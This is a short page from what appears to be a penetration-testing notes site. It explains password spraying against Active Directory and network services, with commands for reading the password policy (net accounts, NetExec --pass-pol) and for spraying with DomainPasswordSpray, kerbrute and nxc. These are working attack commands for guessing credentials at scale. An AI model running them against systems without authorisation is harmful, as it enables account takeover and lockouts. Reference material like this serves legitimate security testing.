---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Password Spray

{% hint style="danger" %}
Accounts can be locked during the process. Always check the password policy before starting the attack.
{% endhint %}

## Password Policy

Checking password policy is important for creating a sufficient wordlist. also, it is important to look for the **Lockout threshold** in order to avoid account lockouts during the brute-force.

Retrieve the password policy:

```batch
net accounts
```

using NetExec:

```bash
nxc smb <ip_address> -u <username> -p <pass> --pass-pol
```

## PowerShell Script

{% embed url="https://github.com/dafthack/DomainPasswordSpray" %}

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

## Kerbrute

If valid usernames are known, perform a password spray to find weak passwords:

```bash
kerbrute passwordspray <username_list> <password> -d <domain_name> --dc <dc_ip>
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>Password spray using <code>kerbrute</code></p></figcaption></figure>

## NXC

Another method to spray passwords, particularly targeting various services:

```bash
nxc <service> <target> -u <username_list> -p <password> --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Password spray using <code>nxc</code></p></figcaption></figure>

